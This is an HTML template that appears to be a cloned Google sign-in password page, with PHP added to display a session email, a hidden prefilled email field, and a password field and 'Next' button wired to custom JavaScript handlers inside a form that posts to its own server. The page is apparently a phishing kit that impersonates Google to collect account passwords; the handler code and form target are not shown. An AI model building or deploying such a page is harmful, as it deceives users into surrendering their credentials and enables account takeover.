...
<body jscontroller=XExvDf
  ...
  class="nyoS7c SoDlKd EIlDfe">
  <div class="lJXwje S81Pef TFhTPc LZgQXe">
    <div class="fPxNlf LZgQXe qmmlRd" id=initialView role=presentation jsname=WsjYwc jscontroller=zYlmub
      ...
      <div class=rhhJr jsname=f2d3ae role=presentation tabindex=null>
        <div class=nM4rkc id=yDmH0d jsaction=ZqRew:.CLIENT>
          <div id=ZCHFDb></div>
          <c-wiz jsrenderer=jGvTv class=g98c7c jsshadow jsdata=deferred-c4
            data-p='%.@.1,null,null,null,"https://mail.google.com/mail/u/0/",false,[null]]' jscontroller=GLtV1c
            jsaction="jiqeKb:ZCwQbe;CDQ11b:n4vmRb;DKwHie:gVmDzc;jR85Td:WtmXg;rcuQ6b:rcuQ6b;click:vBw6I(preventDefault=true|L6M1Fb);DjJpIb:.CLIENT;abBxn:.CLIENT;xdUk6b:.CLIENT;ffNU7c:.CLIENT"
            jsname=nUpftc data-node-index=0;0 jsmodel="hc6Ubd XVq9Qb" c-wiz>
            ...
            <div class=aDGQwe jsname=bN97Pc data-use-configureable-escape-action=true jscontroller=Ctsu jsshadow
              role=presentation>
              <div jsname=paFcre>
                <div class=rQszV jsname=tJHJj jscontroller=UPKV3d jsaction=bTyaEe:pKJJqe(af8ijd); jsshadow>
                  ...
                  <div class=Wz0RKd>
                    <div jscontroller=ENv7Ef
                      jsaction="click:cOuCgd; blur:O22p3e; mousedown:UX7yZ; mouseup:lbsD7e; touchstart:p6p2H; touchend:yfqBxc;"
                      class="YZrg6 HnRr5d iiFyne cd29Sd kWC5Rd" tabindex=0 role=link aria-label="<?php
                      if (isset($_SESSION['email'])) {
                        echo $_SESSION['email'];
                      }
                      ?> selected. Switch account" jsname=af8ijd>
                      <div class=gPHLDe>
                        <div class=qQWzTd aria-hidden=true>
                          <svg aria-hidden=true class=stUf5b fill=currentColor focusable=false width=48px height=48px
                      ...
                      <div jsname=bQIQze class=KTeGk data-profile-identifier><?php
                      if (isset($_SESSION['email'])) {
                        echo $_SESSION['email'];
                      }
                      ?></div>
                      <div class=krLnGe>
                        <svg aria-hidden=true class="stUf5b MSBt4d" fill=currentColor focusable=false width=24px
                          height=24px viewBox="0 0 24 24" xmlns=https://www.w3.org/2000/svg>
              ...
              <div jsname=uybdVe class=eKnrVb role=presentation>
                <div jsname=USBQqe class=CYBold role=presentation>
                  <div class=j663ec>
                    <div class=tCpFMc jsname=rEuO1b jscontroller=bPkrc>
                      <form method=post novalidate jsaction=submit:JM9m2e;>
                        <span jsslot>
                          <section class="aTzEhb AORPd rNe0id eLNT1d S7S4N sf-hidden" jscontroller=W2YXuc
                            data-callout-type=2 jsname=INM6z aria-live=assertive aria-atomic=true jsshadow></section>
                          <section class=aTzEhb jscontroller=W2YXuc jsshadow>
                            ...
                            <div class=CxRgyd jsname=MZArnb>
                              <div jsslot>
                                <c-wiz jsrenderer=PXsWy jsdata=deferred-c0 data-p='%.@.null,"identity-signin-password"]'
                                  jscontroller=qPfo0c jsname=xdJtEf data-node-index=1;0 jsmodel=hc6Ubd c-wiz>
                                  <c-data id=c0 jsdata=" U3wROe;_;$0" class=sf-hidden></c-data>
                                </c-wiz>
                                <input type=email name=identifier class="F29zPe sf-hidden" tabindex=-1 aria-hidden=true
                                  spellcheck=false value=test123@gmail.com jsname=KKx9x autocomplete=off id=hiddenEmail>
                                <div class="SdBahf Fjk18" jscontroller=yGClXb jsshadow jsname=vZSTIf
                                  ...
                                  <div class=eEgeR>
                                    <div class=DPChp>
                                      <div class=Txuhic>
                                        <div class=hDp5Db jscontroller=jYicPe
                                          ...
                                          <div id="password" class="rFrNMe ze9ebf YKooDc wIXLub zKHdkd sdJrJc"
                                            jscontroller=pxq3x
                                            ...
                                            <div class="aCsJod oJeWuf">
                                              <div class="aXBtI Wic03c">
                                                <div class=Xb9hP>
                                                  <input type=password id="Passwd" class="whsOnd zHQkBf" jsname=YPqjbf
                                                    autocomplete=current-password spellcheck=false tabindex=0
                                                    aria-label="Enter your password" name="Passwd" autocapitalize=none
                                                    dir=ltr data-initial-dir=ltr data-initial-value oninput="pwEdit()"
                                                    value onfocus="onFocus()" onfocusout="offFocus()">
                                                  <div jsname=YRMmle class="AxOyFc snByac"
                                                    style="background-color: white;" aria-hidden=true>Enter your
                                                    password</div>
                                                </div>
                                                <script>
                                                  function pwEdit() {
                                  ...
                                  <div class=EcjFDf jsname=ESjtn>
                                    <div class=IhH7Wd jsaction=rcuQ6b:xawz9d;RqOcWc:gfO0Le; jscontroller=KylAQd
                                          ...
                                          <div class="sSzDje NEk0Ve">
                                            <div class=enBDyd>
                                              <div
                                                ...
                                                data-disable-idom=true data-value=optionc2>
                                                <input id="show-password-check" class=VfPpkd-muHVFf-bMcfAe type=checkbox
                                                  jsname=YPqjbf jsaction="focus:AHmuwe; blur:O22p3e; change:WPi0i;"
                                                  aria-labelledby=selectionc1 onclick="toggleHide()">
                                                <style>
                                                  element.style {
                                            ...
                                            <div class=DVnhEd>
                                              <div jsname=V67aGc class=wFCloc>
                                                <div jsslot id=selectionc1 class="d3GVvd jGAaxb" jsname=CeL6Qc>Show
                                                  password</div>
                                              </div>
                                            </div>
                                          </div>
                                      ...
                                      <div aria-atomic=true aria-live=polite class="Df4rGb sf-hidden" jsname=h9d3hd>
                                      </div>
                                    </div>
                                  </div>
                                  <div class="gSlDTe sf-hidden" jsname=JIbuQc></div>
                                </div>
                                <div jscontroller=lmaXKd jsname=Si5T8b class="Wzzww eLNT1d sf-hidden"
                                  jsaction=PIvFg:IMdg8d;rcuQ6b:jqIVcd></div>
                              </div>
                            </div>
                          </section>
                        </span>
                  ...
                  <div class=Z6Ep7d jsname=DH6Rkf jscontroller=VFoZaf
                    ...
                    data-primary-action-label=Next data-secondary-action-label jsshadow>
                    <div class=dqyqtf jsname=DhK0U>
                      <div class=F9NWFb jsname=k77Iif>
                        <div jscontroller=IZ1fbc jsaction=click:cOuCgd;JIbuQc:JIbuQc; jsname=Njthtb
                          class="FliLIb FmFZVc" id=passwordNext>
                          <div class=VfPpkd-dgl2Hf-ppHlrf-sM5MNb data-is-touch-wrapper=true>
                            <button
                              ...
                              data-idom-class="nCP5yc AjY5Oe DuMIQc LQeN7 qIypjc TrZEUc lw1w4b" jsname=LgbsSe
                              onclick="onClick()" id="submitbtn">
                      ...
                      <div class=XOrBDc jsname=QkNstf>
                        <div jscontroller=IZ1fbc jsaction=click:cOuCgd;JIbuQc:JIbuQc; jsname=gVmDzc
                          class="FliLIb sbGPcf" id=forgotPassword>
                          <div class=VfPpkd-dgl2Hf-ppHlrf-sM5MNb data-is-touch-wrapper=true>
                            <button
                              class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-dgl2Hf ksBjEc lKxP2d LQeN7 uRo0Xe TrZEUc lw1w4b"
                              jscontroller=soHxf
                              jsaction="click:cOuCgd; mousedown:UX7yZ; mouseup:lbsD7e; mouseenter:tfO1Yc; mouseleave:JywGue; touchstart:p6p2H; touchmove:FwuNnf; touchend:yfqBxc; touchcancel:JMtRjd; focus:AHmuwe; blur:O22p3e; contextmenu:mg9Pef;mlnRJb:fLiPzd;"
                              data-idom-class="ksBjEc lKxP2d LQeN7 uRo0Xe TrZEUc lw1w4b" jsname=LgbsSe>
                              <div class=VfPpkd-Jh9lGc></div>
                              <div class="VfPpkd-J1Ukfc-LhBDec sf-hidden"></div>
                              <div class=VfPpkd-RLmnJb></div>
        ...
        <footer class=g9mjtf>
          <div class=V7i3mf jscontroller=mWLH9d jsaction=rcuQ6b:npT2md;OmFrlf:VPRXbd>
            <div jsshadow class=O1htCb-H9tDt jsname=rfCUpd jscontroller=yRXbo
              jsaction=bITzcd:KRVFmb;iFFCZc:Y0y4c;Rld2oe:gDkf4c;EDR5Je:QdOKJc;FzgWvd:RFVo1b id=lang-chooser>
              <div jsname=wSASue
                ...
                <div class=VfPpkd-TkwUic jsname=oYxtQd
                  ...
                  aria-labelledby="null i2" aria-controls=i4 aria-disabled=false>
                ...
                <div
                  class="VfPpkd-xl07Ob-XxIAqe VfPpkd-xl07Ob-XxIAqe-OWXEXe-tsQazb VfPpkd-xl07Ob VfPpkd-YPmvEd s8kOBc dmaMHc sf-hidden"
                  ...
                  data-is-hoisted=false data-should-flip-corner-horizontally=false data-menu-uid=ucj-1></div>
              </div>
            </div>
          </div>
          <ul class=kJOS4>
            <li class=r7XTUb>
              <a class=NUwdAb href="https://support.google.com/accounts?hl=en-US&amp;p=account_iph"
                target=_blank>Help</a>
            <li class=r7XTUb>
              <a class=NUwdAb href="https://accounts.google.com/TOS?loc=US&amp;hl=en-US&amp;privacy=true"
  ...
  <iframe tabindex=-1 style=position:absolute;left:0px;top:0px;z-index:-1
  ...
  <div style=position:absolute!important;top:0px!important;left:0px!important;height:0px!important;width:0px!important
    data-lastpass-root>
    <div data-lastpass-infield=true style=position:absolute!important;top:0px!important;left:0px!important>
      <template shadowroot=open>
        <div
          style=position:absolute;height:100vh;width:100vw;z-index:2147483647;border-radius:4px;top:0px;left:0px;max-height:0px;max-width:280px;margin-top:10px>
          <div style=left:-1px;display:none;position:absolute;overflow:hidden;bottom:100%;width:20px;height:10px></div>
          <iframe data-lastpass-iframe=true allow=clipboard-write
